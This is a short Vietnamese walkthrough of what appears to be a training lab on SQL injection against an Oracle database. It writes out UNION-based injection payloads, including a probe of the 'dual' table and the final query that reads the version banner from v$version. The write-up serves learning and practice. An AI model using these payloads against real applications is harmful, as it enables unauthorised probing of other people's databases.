![image](https://user-images.githubusercontent.com/125866921/231353564-40191116-0fa3-4a68-97ed-ebaff327283e.png)

  - Ta thử lại các bước ở các lab trước nhưng có vẻ nó không thành công.  
  - Do đó ta phải tìm 1 cách nào khác.  
  - Theo đề bài gợi ý là ``querying the database type and version on Oracle``. Ta thử trường hợp như sau:

        ' UNION SELECT 'Trongdeptrai', 'sapcongiu' FROM dual --  
        
      - ``dual`` là một bảng đặc biệt trong cơ sở dữ liệu Oracle chỉ chứa một hàng và một cột, thường được sử dụng cho mục đích kiểm tra hoặc làm bảng giả khi không có bảng nào khác khả dụng.  

![image](https://user-images.githubusercontent.com/125866921/231355732-b1eeff75-045b-4dae-b1d4-7a6fe07c8540.png)

  - Nó đã hoạt động , việc cần làm bây giờ là tìm ra phiên bản hiện tại của nó.  
  - Tham khảo 1 vòng ``SQLi cheat sheet`` thì mình tìm ra được lệnh truy vấn này đối với ``Oracle``.  

        ' UNION SELECT banner FROM v$version --
        
  - Nhưng nó không thành công, có thể do thiếu cột nào đó, thêm giá trị ``NULL`` vào xem sao.  

![image](https://user-images.githubusercontent.com/125866921/231356341-5aee1903-929a-46c8-91a3-2b84e78cb960.png)

Với câu lệnh truy vấn sau thì ta đã hoàn thành lab:  

    ' UNION SELECT banner, NULL FROM v$version --
